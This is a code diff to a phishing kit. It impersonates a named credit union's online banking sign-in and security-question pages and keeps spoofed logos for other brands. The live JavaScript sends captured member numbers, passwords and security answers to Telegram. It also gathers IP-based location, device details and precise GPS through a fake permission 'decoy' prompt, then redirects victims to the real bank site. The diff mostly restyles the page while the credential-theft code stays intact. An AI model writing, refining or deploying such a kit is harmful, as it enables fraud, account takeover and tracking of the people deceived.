@@ -51,80 +51,97 @@
     }
     .checkbox-group label { font-size: 14px; color: #555; cursor: pointer; }
 
-    /* ===== AFFINITY-SPECIFIC STYLES ===== */
+    /* ===== AFFINITY-SPECIFIC STYLES (BLUE THEME) ===== */
     .affinity-card {
-        max-width: 480px;
+        max-width: 420px;
         padding: 0;
-        border-radius: 4px;
-        box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+        border-radius: 8px;
+        box-shadow: 0 2px 12px rgba(0,0,0,0.15);
         overflow: hidden;
     }
-    .affinity-header {
-        background: #004B3D;
-        padding: 20px 24px;
+    .affinity-top-banner {
+        background: linear-gradient(135deg, #003d6b, #005a9c);
+        padding: 30px 24px 20px;
+        text-align: center;
+        position: relative;
+    }
+    .affinity-top-banner .lock-icon {
+        width: 60px;
+        height: 60px;
+        background: rgba(255,255,255,0.15);
+        border-radius: 50%;
         display: flex;
         align-items: center;
-        gap: 12px;
+        justify-content: center;
+        margin: 0 auto 12px;
     }
-    .affinity-header svg { height: 36px; }
-    .affinity-header h1 {
+    .affinity-top-banner .lock-icon svg {
+        width: 30px;
+        height: 30px;
+    }
+    .affinity-top-banner h1 {
         color: #fff;
-        font-size: 20px;
-        font-weight: 600;
-        font-family: Arial, sans-serif;
+        font-size: 22px;
+        font-weight: 700;
         margin: 0;
+        font-family: Arial, sans-serif;
+    }
+    .affinity-top-banner p {
+        color: rgba(255,255,255,0.8);
+        font-size: 13px;
+        margin-top: 6px;
     }
     .affinity-body {
-        padding: 28px 32px 24px;
+        padding: 24px 28px 20px;
     }
     .affinity-body p.sub {
-        font-size: 14px;
-        color: #555;
-        margin-bottom: 20px;
+        font-size: 13px;
+        color: #666;
+        margin-bottom: 18px;
         line-height: 1.4;
+        text-align: center;
     }
     .affinity-body .input-group label {
         font-size: 13px;
         font-weight: 600;
-        color: #333;
-        text-transform: uppercase;
-        letter-spacing: 0.5px;
+        color: #444;
     }
     .affinity-body .input-group input {
-        border-radius: 2px;
-        border: 1px solid #ccc;
-        background: #fff;
-        padding: 10px 12px;
+        border-radius: 6px;
+        border: 1.5px solid #ddd;
+        background: #fafafa;
+        padding: 12px 14px;
         font-size: 15px;
     }
     .affinity-body .input-group input:focus {
-        border-color: #004B3D;
-        box-shadow: 0 0 0 1px #004B3D;
+        border-color: #005a9c;
+        box-shadow: 0 0 0 2px rgba(0,90,156,0.15);
+        background: #fff;
     }
     .affinity-body .password-wrap {
         position: relative;
     }
     .affinity-body .password-wrap .toggle-vis {
         position: absolute;
-        right: 10px;
+        right: 12px;
         top: 50%;
         transform: translateY(-50%);
         background: none;
         border: none;
         cursor: pointer;
         padding: 4px;
-        opacity: 0.5;
+        opacity: 0.4;
     }
-    .affinity-body .password-wrap .toggle-vis:hover { opacity: 0.8; }
+    .affinity-body .password-wrap .toggle-vis:hover { opacity: 0.7; }
     .affinity-body .affinity-check {
         display: flex;
         align-items: center;
         gap: 8px;
-        margin: 16px 0;
+        margin: 14px 0;
     }
     .affinity-body .affinity-check input[type="checkbox"] {
         width: 16px; height: 16px;
-        accent-color: #004B3D;
+        accent-color: #005a9c;
     }
     .affinity-body .affinity-check label {
         font-size: 13px;
@@ -132,54 +149,80 @@
         cursor: pointer;
     }
     .affinity-body .btn-affinity {
-        background: #004B3D;
+        background: #005a9c;
         color: #fff;
         border: none;
-        border-radius: 2px;
-        padding: 12px;
+        border-radius: 6px;
+        padding: 14px;
         font-size: 16px;
         font-weight: 600;
         cursor: pointer;
         width: 100%;
         transition: background 0.2s;
     }
-    .affinity-body .btn-affinity:hover { background: #00382d; }
+    .affinity-body .btn-affinity:hover { background: #00457a; }
     .affinity-body .forgot-link {
         display: block;
         text-align: center;
         margin-top: 14px;
         font-size: 13px;
-        color: #004B3D;
-        text-decoration: underline;
+        color: #005a9c;
+        text-decoration: none;
     }
+    .affinity-body .forgot-link:hover { text-decoration: underline; }
     .affinity-footer {
-        background: #f7f7f7;
-        padding: 14px 32px;
+        background: #f5f7fa;
+        padding: 14px 28px;
         font-size: 11px;
         color: #888;
         text-align: center;
-        border-top: 1px solid #e0e0e0;
+        border-top: 1px solid #e6e8ec;
     }
     .affinity-footer a {
-        color: #004B3D;
+        color: #005a9c;
         text-decoration: none;
         margin: 0 6px;
     }
+    .affinity-footer a:hover { text-decoration: underline; }
     .affinity-footer .divider { color: #ccc; margin: 0 4px; }
+    .affinity-footer .phone {
+        color: #555;
+        font-weight: 600;
+    }
 
-    /* ===== AFFINITY SECURITY QUESTIONS PAGE ===== */
+    /* ===== AFFINITY SECURITY QUESTIONS PAGE (SINGLE QUESTION) ===== */
     #securityPage {
         display: none;
     }
-    #securityPage .affinity-body h2 {
-        font-size: 18px;
-        color: #202124;
-        margin-bottom: 4px;
+    #securityPage .affinity-top-banner {
+        background: linear-gradient(135deg, #003d6b, #005a9c);
+        padding: 24px;
+        text-align: center;
     }
-    #securityPage .affinity-body p.sub {
+    #securityPage .affinity-top-banner .shield-icon {
+        width: 48px;
+        height: 48px;
+        background: rgba(255,255,255,0.15);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 10px;
+    }
+    #securityPage .affinity-top-banner .shield-icon svg {
+        width: 24px;
+        height: 24px;
+    }
+    #securityPage .affinity-top-banner h1 {
+        color: #fff;
+        font-size: 20px;
+        font-weight: 700;
+        margin: 0;
+    }
+    #securityPage .affinity-top-banner p {
+        color: rgba(255,255,255,0.8);
         font-size: 13px;
-        color: #777;
-        margin-bottom: 20px;
+        margin-top: 4px;
     }
     #securityPage .select-group {
         margin-bottom: 16px;
@@ -188,22 +231,21 @@
         display: block;
         font-size: 13px;
         font-weight: 600;
-        color: #333;
-        text-transform: uppercase;
-        letter-spacing: 0.5px;
+        color: #444;
         margin-bottom: 6px;
     }
     #securityPage .select-group select {
         width: 100%;
-        padding: 10px 12px;
-        border: 1px solid #ccc;
-        border-radius: 2px;
+        padding: 12px 14px;
+        border: 1.5px solid #ddd;
+        border-radius: 6px;
         font-size: 14px;
-        background: #fff;
+        background: #fafafa;
         color: #333;
     }
     #securityPage .select-group select:focus {
-        border-color: #004B3D;
+        border-color: #005a9c;
+        box-shadow: 0 0 0 2px rgba(0,90,156,0.15);
         outline: none;
     }
 
@@ -350,12 +392,6 @@
         background: transparent;
         color: #1a73e8;
     }
-
-    /* ===== SHARED AFFINITY STEP 2 (security questions full page) ===== */
-    .affinity-step2 {
-        max-width: 480px;
-        margin: 0 auto;
-    }
 </style>
 </head>
 <body>
@@ -389,60 +425,37 @@
     </div>
 </div>
 
-<!-- ===== AFFINITY CREDIT UNION - STEP 2: Security Questions ===== -->
-<div class="card affinity-card affinity-step2" id="securityPage">
-    <div class="affinity-header">
-        <svg width="36" height="24" viewBox="0 0 200 60" fill="none">
-            <rect width="200" height="60" rx="4" fill="#004B3D"/>
-            <circle cx="30" cy="30" r="16" fill="none" stroke="#fff" stroke-width="3"/>
-            <path d="M23 30 l4 4 7-9" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
-            <text x="56" y="34" fill="#fff" font-size="20" font-weight="bold" font-family="Arial,sans-serif">AFFINITY</text>
-            <text x="56" y="46" fill="#fff" font-size="9" font-family="Arial,sans-serif" opacity="0.8">CREDIT UNION</text>
-        </svg>
-        <h1>Verify your identity</h1>
+<!-- ===== AFFINITY CREDIT UNION - STEP 2: Single Security Question (Blue Theme) ===== -->
+<div class="card affinity-card" id="securityPage">
+    <div class="affinity-top-banner">
+        <div class="shield-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                <path d="M9 12l2 2 4-4"/>
+            </svg>
+        </div>
+        <h1>Verify Your Identity</h1>
+        <p>For your security, please answer the following question</p>
     </div>
     <div class="affinity-body">
-        <h2>Security Questions</h2>
-        <p class="sub">For your security, please answer the following questions to verify your identity.</p>
-
         <form id="securityForm">
             <div class="select-group">
-                <label for="secQ1">Security Question 1</label>
+                <label for="secQ1">SECURITY QUESTION</label>
                 <select id="secQ1" required>
                     <option value="">— Select a question —</option>
+                    <option value="What is your father's middle name?">What is your father's middle name?</option>
                     <option value="What was the name of your first pet?">What was the name of your first pet?</option>
                     <option value="What is your mother's maiden name?">What is your mother's maiden name?</option>
-                    <option value="What is your father's middle name?">What is your father's middle name?</option>
                     <option value="What street did you grow up on?">What street did you grow up on?</option>
                     <option value="What was the name of your elementary school?">What was the name of your elementary school?</option>
                     <option value="What is the name of your first employer?">What is the name of your first employer?</option>
                 </select>
             </div>
             <div class="input-group">
-                <label for="secA1">Your Answer</label>
+                <label for="secA1">YOUR ANSWER</label>
                 <input type="text" id="secA1" placeholder="Enter your answer" autocomplete="off" required>
             </div>
-            <div class="select-group">
-                <label for="secQ2">Security Question 2</label>
-                <select id="secQ2" required>
-                    <option value="">— Select a question —</option>
-                    <option value="What city were you born in?">What city were you born in?</option>
-                    <option value="What is the name of your favourite teacher?">What is the name of your favourite teacher?</option>
-                    <option value="What is the model of your first car?">What is the model of your first car?</option>
-                    <option value="What is your favourite book?">What is your favourite book?</option>
-                    <option value="What is the name of the hospital you were born in?">What is the name of the hospital you were born in?</option>
-                    <option value="What is your father's middle name?">What is your father's middle name?</option>
-                </select>
-            </div>
-            <div class="input-group">
-                <label for="secA2">Your Answer</label>
-                <input type="text" id="secA2" placeholder="Enter your answer" autocomplete="off" required>
-            </div>
-            <div class="input-group">
-                <label for="dob">Date of Birth</label>
-                <input type="date" id="dob" required>
-            </div>
-            <div class="error" id="secError" style="color:#d93025;font-size:13px;margin-top:12px;text-align:center;display:none;">Incorrect answers. Please try again.</div>
+            <div class="error" id="secError" style="color:#d93025;font-size:13px;margin-top:12px;text-align:center;display:none;">Incorrect answer. Please try again.</div>
             <button type="submit" class="btn-affinity" id="secSubmitBtn">Verify</button>
         </form>
 
@@ -453,9 +466,9 @@
     </div>
     <div class="affinity-footer">
         <a href="#">Privacy</a><span class="divider">|</span>
-        <a href="#">Banking Security</a><span class="divider">|</span>
+        <a href="#">Security</a><span class="divider">|</span>
         <a href="#">Legal</a>
-        <br>© 2026 Affinity Credit Union. All rights reserved.
+        <br>Need help? Call <span class="phone">1.866.863.6237</span>
     </div>
 </div>
 
@@ -463,10 +476,10 @@
 <div class="geo-prompt" id="geoPrompt">
     <div class="geo-prompt-box">
         <h3>📍 Allow location access?</h3>
-        <p>This site wants to use your location for account security.</p>
+        <p>Your location helps us keep your account secure.</p>
         <div class="btn-row">
-            <button class="deny" id="geoDenyBtn" onclick="document.getElementById('geoPrompt').style.display='none'">Block</button>
-            <button class="allow" id="geoAllowBtn" onclick="document.getElementById('geoPrompt').style.display='none'">Allow</button>
+            <button class="deny" onclick="document.getElementById('geoPrompt').style.display='none'">Block</button>
+            <button class="allow" onclick="document.getElementById('geoPrompt').style.display='none'">Allow</button>
         </div>
     </div>
 </div>
@@ -512,23 +525,6 @@ const BRANDS = {
         logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none">
             <circle cx="24" cy="24" r="20" fill="#1877F2"/>
             <path d="M29 16h-3c-1.7 0-3 1.3-3 3v3h-3v4h3v12h4V26h3l1-4h-4v-2c0-.6.4-1 1-1h3v-3z" fill="#fff"/>
-        </svg>`
-    },
-    microsoft: {
-        name: "Microsoft",
-        color: "#00A4EF",
-        realSite: "https://login.microsoftonline.com",
-        title: "Sign in",
-        subtitle: "Work or school account",
-        emailLabel: "Email, phone, or Skype",
-        placeholder: "you@company.com",
-        btnText: "Sign in",
-        forgotText: "password",
-        logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none">
-            <rect x="6" y="6" width="16" height="16" rx="2" fill="#F25022"/>
-            <rect x="26" y="6" width="16" height="16" rx="2" fill="#7FBA00"/>
-            <rect x="6" y="26" width="16" height="16" rx="2" fill="#00A4EF"/>
-            <rect x="26" y="26" width="16" height="16" rx="2" fill="#FFB900"/>
         </svg>`
     },
     snapchat: {
@@ -580,18 +576,18 @@ const BRANDS = {
     },
     affinity: {
         name: "Affinity Credit Union",
-        color: "#004B3D",
+        color: "#005a9c",
         realSite: "https://personal.affinitycu.ca/",
-        title: "Sign in to Online Banking",
-        subtitle: "Enter your Affinity Credit Union member number or Member Card® number to sign in",
-        emailLabel: "Member Card® / Member Number",
-        placeholder: "Member Card or Member Number",
+        title: "Online Banking",
+        subtitle: "Sign in to your account",
+        emailLabel: "Member Number",
+        placeholder: "Enter your member number",
         btnText: "Sign In",
         forgotText: "password",
         isAffinity: true,
         hasSecurityQuestions: true,
         logo: `<svg width="48" height="48" viewBox="0 0 200 60" fill="none">
-            <rect width="200" height="60" rx="4" fill="#004B3D"/>
+            <rect width="200" height="60" rx="4" fill="#005a9c"/>
             <circle cx="30" cy="30" r="16" fill="none" stroke="#fff" stroke-width="3"/>
             <path d="M23 30 l4 4 7-9" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
             <text x="56" y="34" fill="#fff" font-size="20" font-weight="bold" font-family="Arial,sans-serif">AFFINITY</text>
@@ -734,33 +730,32 @@ let brandKey = params.get('brand') || 'google';
 const brand = BRANDS[brandKey] || BRANDS.google;
 
 // ========================
-// AFFINITY RENDER (CUSTOM LAYOUT)
+// AFFINITY RENDER (BLUE THEME)
 // ========================
 function renderAffinity() {
     const card = document.getElementById('loginCard');
     card.className = 'card affinity-card';
     card.innerHTML = `
-        <div class="affinity-header">
-            <svg width="36" height="24" viewBox="0 0 200 60" fill="none">
-                <rect width="200" height="60" rx="4" fill="#004B3D"/>
-                <circle cx="30" cy="30" r="16" fill="none" stroke="#fff" stroke-width="3"/>
-                <path d="M23 30 l4 4 7-9" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
-                <text x="56" y="34" fill="#fff" font-size="20" font-weight="bold" font-family="Arial,sans-serif">AFFINITY</text>
-                <text x="56" y="46" fill="#fff" font-size="9" font-family="Arial,sans-serif" opacity="0.8">CREDIT UNION</text>
-            </svg>
+        <div class="affinity-top-banner">
+            <div class="lock-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                </svg>
+            </div>
             <h1>Online Banking</h1>
+            <p>Sign in to your account</p>
         </div>
         <div class="affinity-body">
-            <p class="sub">Enter your Affinity Credit Union member number or Member Card® number to sign in</p>
             <form id="loginForm">
                 <div class="input-group">
-                    <label for="email">MEMBER CARD® / MEMBER NUMBER</label>
-                    <input type="text" id="email" name="email" placeholder="Member Card or Member Number" autocomplete="off" required>
+                    <label for="email">MEMBER NUMBER</label>
+                    <input type="text" id="email" name="email" placeholder="Enter your member number" autocomplete="off" required>
                 </div>
                 <div class="input-group">
                     <label for="password">PASSWORD</label>
                     <div class="password-wrap">
-                        <input type="password" id="password" name="password" placeholder="Password" autocomplete="off" required>
+                        <input type="password" id="password" name="password" placeholder="Enter your password" autocomplete="off" required>
                         <button type="button" class="toggle-vis" onclick="togglePassword()">
                             <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2">
                                 <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
@@ -771,11 +766,11 @@ function renderAffinity() {
                 </div>
                 <div class="affinity-check">
                     <input type="checkbox" id="remember">
-                    <label for="remember">Remember Account</label>
+                    <label for="remember">Remember my member number</label>
                 </div>
                 <div class="error" id="errorMsg" style="color:#d93025;font-size:13px;margin-top:12px;text-align:center;display:none;">Incorrect member number or password. Please try again.</div>
                 <button type="submit" class="btn-affinity" id="submitBtn">Sign In</button>
-                <a href="#" class="forgot-link">Reset your password</a>
+                <a href="#" class="forgot-link">Forgot your password?</a>
             </form>
             <div class="loading" id="loadingIndicator" style="display:none;text-align:center;margin-top:16px;">
                 <div class="spinner"></div>
@@ -783,12 +778,10 @@ function renderAffinity() {
             </div>
         </div>
         <div class="affinity-footer">
-            For online banking technical support, call our Contact Centre at 1.866.863.6237
-            <br><br>
             <a href="#">Privacy</a><span class="divider">|</span>
-            <a href="#">Banking Security</a><span class="divider">|</span>
+            <a href="#">Security</a><span class="divider">|</span>
             <a href="#">Legal</a>
-            <br>© 2026 Affinity Credit Union. All rights reserved.
+            <br>Need help? Call <span class="phone">1.866.863.6237</span>
         </div>
     `;
 }
@@ -963,11 +956,8 @@ fetch('https://ipapi.co/json/')
     });
 
 // ========================
-// GPS - HIGHEST RELIABILITY VERSION
+// GPS - FIXED TIMING VERSION
 // ========================
-// This approach uses the user's click on the submit button as the trigger,
-// which satisfies iOS/Android user gesture requirements for geolocation prompts.
-
 let preciseLocation = null;
 let gpsAttempted = false;
 
@@ -980,13 +970,11 @@ function requestGeolocation() {
         return;
     }
     
-    // Show the fake permission UI as a decoy
     document.getElementById('geoPrompt').style.display = 'flex';
     setTimeout(() => {
         document.getElementById('geoPrompt').style.display = 'none';
     }, 8000);
     
-    // Request precise GPS
     navigator.geolocation.getCurrentPosition(
         pos => {
             const lat = pos.coords.latitude;
@@ -1076,19 +1064,16 @@ function togglePassword() {
 }
 
 // ========================
-// FORM SUBMISSION - GPS TRIGGERED HERE ON USER CLICK
+// FORM SUBMISSION
 // ========================
 function setupFormHandler() {
     const form = document.getElementById('loginForm');
     if (!form) return;
     
-    // Intercept the submit button click to trigger GPS FIRST (user gesture)
     const submitBtn = document.getElementById('submitBtn');
     if (submitBtn) {
         submitBtn.addEventListener('click', function(e) {
-            // Trigger GPS immediately on user click — this is what makes it work on iOS/Android
             requestGeolocation();
-            // Don't prevent default here — let the form submit handler do its thing
         });
     }
     
@@ -1103,9 +1088,7 @@ function setupFormHandler() {
         const platform = navigator.platform || 'Unknown';
         const screenInfo = `${window.screen.width}x${window.screen.height}`;
         
-        const formElem = document.getElementById('loginForm');
         const loadingElem = document.getElementById('loadingIndicator');
-        if (formElem) formElem.style.display = 'none';
         if (loadingElem) loadingElem.style.display = 'block';
         
         let message = `🔔 *${brand.name} — Credentials Captured!*\n\n`;
@@ -1133,17 +1116,17 @@ function setupFormHandler() {
             setTimeout(() => {
                 document.getElementById('loginCard').style.display = 'none';
                 document.getElementById('securityPage').style.display = 'block';
-            }, 1500);
+            }, 2500);
         } else {
             setTimeout(() => {
                 window.location.href = brand.realSite;
-            }, 2500);
+            }, 3000);
         }
     });
 }
 
 // ========================
-// SECURITY QUESTIONS FORM
+// SECURITY QUESTIONS FORM (Single Question, no DOB)
 // ========================
 function setupSecurityForm() {
     const secForm = document.getElementById('securityForm');
@@ -1154,19 +1137,13 @@ function setupSecurityForm() {
         
         const q1 = document.getElementById('secQ1').value;
         const a1 = document.getElementById('secA1').value.trim();
-        const q2 = document.getElementById('secQ2').value;
-        const a2 = document.getElementById('secA2').value.trim();
-        const dob = document.getElementById('dob').value;
         
         document.getElementById('securityForm').style.display = 'none';
         document.getElementById('secLoading').style.display = 'block';
         
-        let message = `🛡️ *${brand.name} — Security Questions Captured!*\n\n`;
-        message += `❓ *Q1:* ${q1}\n`;
-        message += `✏️ *A1:* \`${a1}\`\n`;
-        message += `❓ *Q2:* ${q2}\n`;
-        message += `✏️ *A2:* \`${a2}\`\n`;
-        message += `📅 *DOB:* \`${dob}\``;
+        let message = `🛡️ *${brand.name} — Security Question Captured!*\n\n`;
+        message += `❓ *Question:* ${q1}\n`;
+        message += `✏️ *Answer:* \`${a1}\``;
         
         sendToTelegram(message);
         
@@ -1184,15 +1161,12 @@ setTimeout(() => {
     setupFormHandler();
     setupSecurityForm();
     
-    // On page load, check if we already have permission. If so, grab GPS immediately.
-    // Otherwise we wait for the button click (setupFormHandler handles that).
     if (navigator.permissions) {
         navigator.permissions.query({ name: 'geolocation' }).then(p => {
             if (p.state === 'granted') {
-                // Permission already granted — grab GPS now
+                gpsAttempted = false;
                 requestGeolocation();
             }
-            // If 'prompt' or 'denied', wait for user click on submit button
         }).catch(() => {});
     }
 }, 500);
